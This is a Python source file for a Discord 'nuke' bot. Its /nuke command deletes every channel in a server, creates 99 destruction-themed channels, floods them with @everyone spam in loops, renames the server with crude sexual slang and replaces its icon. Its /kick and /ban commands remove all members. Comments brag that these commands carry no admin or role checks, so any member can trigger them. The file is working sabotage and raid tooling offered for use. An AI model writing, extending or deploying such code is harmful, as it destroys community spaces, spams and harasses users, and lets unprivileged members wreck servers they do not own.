import discord
from discord.ext import commands
import os
from dotenv import load_dotenv
import asyncio

load_dotenv()

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True

bot = commands.Bot(command_prefix="/", intents=intents)

@bot.event
async def on_ready():
    print(f'{bot.user} has connected to Discord!')
    print(f'Bot is ready and online!')
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} command(s)")
    except Exception as e:
        print(e)

# /start command - Bot status
@bot.tree.command(name="start", description="Check if bot is running")
async def start(interaction: discord.Interaction):
    await interaction.response.send_message("✅ Bot is running and online! 24/7 active!")

# Server name and avatar
FUNNY_NAMES = [
    "🍆 LOUDA LASSAN",
    "💦 MUTH BAZI",
    "🍑 GAND MARO",
    "💋 CHUDAI KI DUKAAN",
    "🔞 ADULT ZONE",
    "🍌 LASSAN PARTY",
    "🌮 TACO TUESDAY",
    "🚀 ROCKET FUELED",
    "💥 CHAOS CENTRAL",
    "🎉 PARTY HARD",
]

# Channel names list
CHANNEL_NAMES = [
    "💀・destroyed",
    "☢️・nuked",
    "💣・nuke-zone",
    "🔥・burnt-zone",
    "☠️・dead-zone",
    "🧨・chaos-zone",
    "💥・exploded",
    "⚠️・system-crashed",
    "☢️・radioactive",
    "💀・graveyard",
    "🔥・hell-zone",
    "💣・bombed",
    "☠️・total-destruction",
    "🧨・chaos-room",
    "💥・everything-gone",
    "🚨・critical-damage",
    "☢️・nuclear-zone",
    "💀・rip-server",
    "🔥・burning-zone",
    "💣・detonation",
    "☠️・fallen-zone",
    "🧨・blast-zone",
    "💥・impact-zone",
    "☢️・nuclear-fallout",
    "💀・dead-server",
    "🔥・inferno",
    "💣・war-zone",
    "☠️・no-survivors",
    "🧨・detonated",
    "💥・massive-damage",
    "☢️・toxic-zone",
    "💀・lost-zone",
    "🔥・ashes",
    "💣・bomb-zone",
    "☠️・death-zone",
    "🧨・blast-area",
    "💥・wrecked",
    "☢️・fallout-zone",
    "💀・destroyed-area",
    "🔥・flame-zone",
    "💣・explosion",
    "☠️・dark-zone",
    "🧨・chaos-area",
    "💥・broken-zone",
    "☢️・nuke-area",
    "💀・server-rip",
    "🔥・scorched-earth",
    "💣・detonation-zone",
    "☠️・end-zone",
    "🧨・blast-room",
    "💥・crash-zone",
    "☢️・toxic-waste",
    "💀・final-zone",
    "🔥・burned-out",
    "💣・nuclear-blast",
    "☠️・dead-end",
    "🧨・destruction-zone",
    "💥・shockwave",
    "☢️・fallout",
    "💀・ruins",
    "🔥・fire-zone",
    "💣・war-room",
    "☠️・death-room",
    "🧨・explosive-zone",
    "💥・wreckage",
    "☢️・hazard-zone",
    "💀・server-ruins",
    "🔥・ash-zone",
    "💣・bomb-site",
    "☠️・darkness",
    "🧨・blast-zone-2",
    "💥・destroyed-2",
    "☢️・nuke-2",
    "💀・dead-zone-2",
    "🔥・inferno-zone",
    "💣・mega-blast",
    "☠️・final-destruction",
    "🧨・chaos-core",
    "💥・impact-zone-2",
    "☢️・nuclear-core",
    "💀・grave-zone",
    "🔥・scorched-zone",
    "💣・mega-nuke",
    "☠️・death-core",
    "🧨・detonation-core",
    "💥・blast-core",
    "☢️・toxic-core",
    "💀・void-zone",
    "🔥・fire-core",
    "💣・bomb-core",
    "☠️・doom-zone",
    "🧨・destruction-core",
    "💥・chaos-core-2",
    "☢️・fallout-core",
    "💀・end-of-server",
    "🔥・ashes-zone",
    "💣・last-blast",
    "☠️・final-ruins",
    "🧨・total-chaos"
]

# Spam messages
SPAM_MESSAGES = [
    "🚨💀 @everyone 💀🚨\n\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n💣 𝐂𝐇𝐀𝐎𝐒 𝐀𝐋𝐄𝐑𝐓 💣\n☢️━━━━━━━━━━━━━━━━━━━━☢️\n\n Server nuked! Channels destroyed! Members scattered!",
    "💥 𝐃𝐄𝐒𝐓𝐑𝐎𝐘 • 𝐍𝐔𝐊𝐄 • 𝐂𝐇𝐀𝐎𝐒 • 𝐃𝐎𝐎𝐌 💥\n\n🧨 Everything is gone\n☢️ Server destroyed\n💣 Total chaos activated",
    "⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n🚨 𝐅𝐈𝐍𝐀𝐋 𝐖𝐀𝐑𝐍𝐈𝐍𝐆 🚨\n⚠️━━━━━━━━━━━━━━━━━━━━⚠️\n\n The server has been NUKED!",
    "💥━━━━━━━━━━━━━━━━━━━━💥\n☠️ 𝐃𝐎𝐎𝐌 𝐌𝐎𝐃𝐄 ☠️\n💥━━━━━━━━━━━━━━━━━━━━💥\n\n All channels destroyed and recreated!",
]

# Confirmation view with buttons
class ConfirmView(discord.ui.View):
    def __init__(self, timeout=60):
        super().__init__(timeout=timeout)
        self.confirmed = False

    @discord.ui.button(label="✅ CONFIRM NUKE", style=discord.ButtonStyle.danger)
    async def confirm_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        self.confirmed = True
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self)
        self.stop()

    @discord.ui.button(label="❌ CANCEL", style=discord.ButtonStyle.secondary)
    async def cancel_button(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.defer()
        for child in self.children:
            child.disabled = True
        await interaction.message.edit(view=self, content="❌ Nuke cancelled!")
        self.stop()

# /nuke command - Delete all channels, create new ones, spam, rename server, change avatar
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="nuke", description="Delete all channels, rename server, change avatar")
async def nuke(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    # Show confirmation button
    view = ConfirmView()
    await interaction.followup.send("⚠️ **ARE YOU SURE?** Click to confirm NUKE!", view=view)
    await view.wait()
    
    if not view.confirmed:
        return
    
    try:
        # Delete all channels
        channels = guild.channels
        total_channels = len(channels)
        deleted_count = 0
        
        await interaction.followup.send(f"🔄 Starting to delete {total_channels} channels...")
        
        for channel in channels:
            try:
                await channel.delete()
                deleted_count += 1
                print(f"Deleted channel: {channel.name}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to delete {channel.name}: {e}")
        
        await interaction.followup.send(f"✅ Deleted {deleted_count}/{total_channels} channels! Now creating 99 new channels...")
        
        # Create new channels
        created_count = 0
        new_channels = []
        
        for channel_name in CHANNEL_NAMES:
            try:
                channel = await guild.create_text_channel(channel_name)
                new_channels.append(channel)
                created_count += 1
                print(f"Created channel: {channel_name}")
                await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to create {channel_name}: {e}")
        
        await interaction.followup.send(f"✅ Created {created_count}/99 new channels! Now spamming messages...")
        
        # Send spam messages to all new channels
        spam_count = 0
        for channel in new_channels:
            try:
                for i in range(999):
                    for msg in SPAM_MESSAGES:
                        try:
                            await channel.send(msg)
                            spam_count += 1
                            await asyncio.sleep(0.05)
                        except Exception as e:
                            print(f"Failed to send message in {channel.name}: {e}")
                            break
            except Exception as e:
                print(f"Error spamming in {channel.name}: {e}")
        
        # Change server name
        import random
        new_name = random.choice(FUNNY_NAMES)
        try:
            await guild.edit(name=new_name)
            await interaction.followup.send(f"✅ Server renamed to: **{new_name}**")
            print(f"Server renamed to: {new_name}")
        except Exception as e:
            print(f"Failed to rename server: {e}")
        
        # Change server avatar
        try:
            cat_image_url = "https://i.pinimg.com/originals/4f/71/37/4f713759b8b8b53173dd3c2e8de8ae76.jpg"
            async with __import__('aiohttp').ClientSession() as session:
                async with session.get(cat_image_url) as resp:
                    if resp.status == 200:
                        avatar_data = await resp.read()
                        await guild.edit(icon=avatar_data)
                        await interaction.followup.send(f"✅ Server avatar changed to cat! 🐱")
                        print("Server avatar changed to cat")
        except Exception as e:
            print(f"Failed to change avatar: {e}")
        
        await interaction.followup.send(f"✅ 💥 SERVER NUKED COMPLETELY! 💥\n✅ Deleted {deleted_count} channels\n✅ Created {created_count}/99 channels\n✅ Sent 999+ spam messages\n✅ Server renamed\n✅ Avatar changed to cat! 🐱")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Nuke command error: {e}")

# /kick command - Kick all members
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="kick", description="Kick all members from the server")
async def kick(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = guild.members
        total_members = len(members)
        kicked_count = 0
        
        await interaction.followup.send(f"🔄 Starting to kick {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:  # Don't kick yourself or bot
                    await member.kick(reason="Server chaos mode activated!")
                    kicked_count += 1
                    print(f"Kicked member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to kick {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 KICKED {kicked_count}/{total_members} members! CHAOS MODE ACTIVATED! 💥")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Kick command error: {e}")

# /ban command - Ban all members
# ✅ NO ADMIN/ROLE CHECKS - ALL MEMBERS CAN USE
@bot.tree.command(name="ban", description="Ban all members from the server")
async def ban(interaction: discord.Interaction):
    await interaction.response.defer()
    
    guild = interaction.guild
    
    if not guild:
        await interaction.followup.send("❌ This command can only be used in a server!")
        return
    
    try:
        members = guild.members
        total_members = len(members)
        banned_count = 0
        
        await interaction.followup.send(f"🔄 Starting to ban {total_members} members...")
        
        for member in members:
            try:
                if member.id != interaction.user.id and not member.bot:  # Don't ban yourself or bot
                    await guild.ban(member, reason="Server chaos mode activated!")
                    banned_count += 1
                    print(f"Banned member: {member.name}")
                    await asyncio.sleep(0.1)
            except Exception as e:
                print(f"Failed to ban {member.name}: {e}")
        
        await interaction.followup.send(f"✅ 💥 BANNED {banned_count}/{total_members} members! TOTAL DEVASTATION! 💥")
        
    except Exception as e:
        await interaction.followup.send(f"❌ Error occurred: {str(e)}")
        print(f"Ban command error: {e}")

# Error handlers
@nuke.error
async def nuke_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@kick.error
async def kick_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

@ban.error
async def ban_error(interaction: discord.Interaction, error: discord.app_commands.AppCommandError):
    await interaction.response.send_message(f"❌ Error: {str(error)}", ephemeral=True)

# Run bot
token = os.getenv('DISCORD_TOKEN')
if token:
    bot.run(token)
else:
    print("❌ DISCORD_TOKEN not found in .env file")
